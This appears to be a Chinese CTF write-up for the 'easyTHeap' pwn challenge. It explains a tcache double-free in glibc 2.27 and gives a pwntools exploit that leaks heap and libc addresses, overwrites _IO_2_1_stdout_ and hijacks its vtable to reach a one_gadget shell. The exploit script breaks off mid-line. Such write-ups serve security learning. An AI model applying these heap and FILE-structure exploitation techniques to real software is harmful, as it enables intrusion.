      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/22/wp-vn-easy-theap/">wp easy theap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="easyTHeap"><a href="#easyTHeap" class="headerlink" title="easyTHeap"></a>easyTHeap</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>v &amp; n</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>该环境为glibc 2.27, 有teache机制.题中有五个功能,利用有限制,malloc只能7次以下, free 3次以下.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx?&quot;</span>);</span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">6</span> || !heap_array[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_array[v1]);</span><br><span class="line">  size_array[v1] = <span class="number">0</span>;                           <span class="comment">// not set ptr as null, can be double free</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拥有uaf漏洞,可以使用teache机制double free任意地址分配.</p>
<h2 id="打法1"><a href="#打法1" class="headerlink" title="打法1"></a>打法1</h2><p>评估: </p>
<p>复杂度: 比较复杂  成功率: 低</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, IO_FILE</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,实现任意地址分配.修改IO_2_1_stdout结构, 实现IO流对vtable的调用来触发one_gadget.</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;vn_pwn_easyTHeap&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">28200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="comment"># 这里由于直接查找_IO_str_jumps找不到,可以采取这样的办法查找_IO_str_jumps,也可以通过调试直接找.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps_offset</span>():</span> </span><br><span class="line">	IO_file_jumps_offset = lib.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">	IO_str_underflow_offset = lib.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">	<span class="keyword">for</span> ref_offset <span class="keyword">in</span> lib.search(p64(IO_str_underflow_offset)):</span><br><span class="line">		possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">		<span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">			<span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br></pre></td></tr></table></figure>

<h4 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x100</span>) <span class="comment">#idx 0</span></span><br><span class="line">ad(<span class="number">0x100</span>) <span class="comment">#idx 1</span></span><br><span class="line"></span><br><span class="line">rm(<span class="number">0</span>) <span class="comment"># double free使fd指向自己,下次开辟可以通过修改fd实现任意地址分配</span></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">dp(<span class="number">0</span>) <span class="comment"># 打印自己本身地址</span></span><br><span class="line">heap_base = u64(ru(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x260</span></span><br><span class="line">li(<span class="string">&#x27;heap_base &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址, 那么怎样才能不满足呢,由于程序中最多只能分配7次,就不能使tcache bin的数量大于7了,那只能小于0,怎样才能小于0, 就采用tcache double free之后,就已经形成一个环,若没有修改fd,就一直在原地分配,分配成功后tcache bin的count - 1,当tcache bin的count小于0时,再次释放任何堆,就不会到tcache bin中了.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一直开辟,直到count 小于0</span></span><br><span class="line">   ad(<span class="number">0x100</span>) <span class="comment"># 2 for ajust</span></span><br><span class="line">ad(<span class="number">0x100</span>) <span class="comment"># 3</span></span><br><span class="line">   <span class="comment"># 这里count 为-1,若开辟后释放,就不会到tcache bin中了</span></span><br><span class="line">ad(<span class="number">0x100</span>) <span class="comment"># 4</span></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">   <span class="comment"># leak heap addr</span></span><br><span class="line">dp(<span class="number">0</span>) <span class="comment"># 当前的fd就是自己本身的地址,泄漏出heap地址</span></span><br><span class="line">heap_base = u64(ru(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x260</span></span><br><span class="line">li(<span class="string">&#x27;heap_base &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>

<h4 id="实现任意地址写入"><a href="#实现任意地址写入" class="headerlink" title="实现任意地址写入"></a>实现任意地址写入</h4><p>这里只需修改chunk 0的fd指向我们想要的地方,再次开辟,就会到我们想要修改的地方.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = p64(_IO_2_1_stdout_) <span class="comment">#修改chunk 0,(因为前几次分配都是重叠在一块chunk上的)的fd指向stdout</span></span><br><span class="line">md(<span class="number">3</span>, p)</span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x100</span>) <span class="comment"># idx 5 for ajust</span></span><br><span class="line">ad(<span class="number">0x100</span>) <span class="comment"># idx 6, 开辟到stdout</span></span><br></pre></td></tr></table></figure>

<p>上面任意地址写入已经实现,如果改写malloc_hook或者free_hook,可以改写成功,但是没有办法触发.这是因为，已经用完了add功能的7次调用,delete功能的3次调用,因此,接下来,就调用不了malloc或free,也就无法触发了.因此,可以劫持_IO_2_1_stdout_的虚表.通过IO流对虚表的调用来触发one_gadget.由于glibc为2.29,因此不能直接伪造虚表,而应该将虚表劫持为_IO_str_jumps_附近</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x00007f1fda7b1a65 &lt;+165&gt;:	lea    rdx,[rip+0x366cf4]        # 0x7f1fdab18760 	&lt;_IO_helper_jumps&gt;</span><br><span class="line">0x00007f1fda7b1a6c &lt;+172&gt;:	lea    rax,[rip+0x367a55]        # 0x7f1fdab194c8</span><br><span class="line">0x00007f1fda7b1a73 &lt;+179&gt;:	sub    rax,rdx</span><br><span class="line">0x00007f1fda7b1a76 &lt;+182&gt;:	mov    rcx,r13</span><br><span class="line">0x00007f1fda7b1a79 &lt;+185&gt;:	sub    rcx,rdx</span><br><span class="line">0x00007f1fda7b1a7c &lt;+188&gt;:	cmp    rax,rcx</span><br><span class="line">0x00007f1fda7b1a7f &lt;+191&gt;:	jbe    0x7f1fda7b1b40 &lt;_IO_puts+384&gt;</span><br><span class="line">0x00007f1fda7b1a85 &lt;+197&gt;:	mov    rdx,rbx</span><br><span class="line">0x00007f1fda7b1a88 &lt;+200&gt;:	mov    rsi,r12</span><br><span class="line">0x00007f1fda7b1a8b &lt;+203&gt;:	call   QWORD PTR [r13+0x38] #调用虚表</span><br></pre></td></tr></table></figure>

<p>只需要让[r13+0x38]为IO_str_finish函数的指针即可,因此，需要将虚表修改为IO_str_jumps – XX,使得,r13+0x38正好对应上<em>IO_str_finish指针, 而IO_str_finish函数会call [_IO_2_1_stdout</em> + 0xE8]</p>
<p>call的前提是_IO_2_1_stdout_的flag的低1字节要为0. 综上,需要劫持<em>IO_2_1_stdout_结构体,修改flags,劫持虚表为IO_str_jumps – XX,修改_IO_2_1_stdout</em>+0xE8处为one_gadget.然后puts的调用即可触发one_gadget</p>
<h4 id="修改IO-2-1-stdout结构体"><a href="#修改IO-2-1-stdout结构体" class="headerlink" title="修改IO_2_1_stdout结构体"></a>修改IO_2_1_stdout结构体</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">p = p64(<span class="number">0xfbad2886</span>) <span class="comment"># 要覆盖flag的最低bit为0</span></span><br><span class="line">   <span class="comment">#中间数据保持不变</span></span><br><span class="line">p += p64(_IO_2_1_stdout_ + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">p += p64(_IO_2_1_stdout_ + <span class="number">0x201</span>)</span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">p += p32(<span class="number">1</span>) <span class="comment"># file num</span></span><br><span class="line">p += p32(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">p += p64(<span class="number">0x000000000a000000</span>)</span><br><span class="line">_IO_stdfile_1_lock = lib.address + (<span class="number">0x7ff3095508c0</span> - <span class="number">0x7ff309163000</span>)</span><br><span class="line">p += p64(_IO_stdfile_1_lock)</span><br><span class="line">p += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">_IO_wide_data_1 = lib.address + (<span class="number">0x7f2fc336a8c0</span> - <span class="number">0x7f2fc2f7f000</span>)</span><br><span class="line">p += p64(_IO_wide_data_1)</span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">p = p.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">#修改对应IO_str_finish函数指针,该函数会调用IO_2_1_stdout_+0xE8处的函数指针</span></span><br><span class="line">p += p64(vtable_jump)</span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(one_gadget) <span class="comment"># IO_2_1_stdout_+0xE8处只需修改为one_gadget</span></span><br><span class="line">md(<span class="number">6</span>, p)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp-1"></a>exp-1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;vn_pwn_easyTHeap&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">28200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps_offset</span>():</span></span><br><span class="line">	IO_file_jumps_offset = lib.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">	IO_str_underflow_offset = lib.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">	<span class="keyword">for</span> ref_offset <span class="keyword">in</span> lib.search(p64(IO_str_underflow_offset)):</span><br><span class="line">		li(<span class="string">&#x27;AA&#x27;</span>)</span><br><span class="line">		possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">		<span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">			<span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 0</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment">#idx 1</span></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak heap addr</span></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	heap_base = u64(ru(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x260</span></span><br><span class="line">	li(<span class="string">&#x27;heap_base &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 2 for ajust</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 3</span></span><br><span class="line">	ad(<span class="number">0x100</span>) <span class="comment"># 4 teache count as -1, so free chunk will not be teache bin</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	_IO_str_jumps_offset = get_IO_str_jumps_offset()</span><br><span class="line"></span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">	li(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	_IO_str_jumps = lib.address + _IO_str_jumps_offset</span><br><span class="line">	_IO_2_1_stdout_ = lib.sym[<span 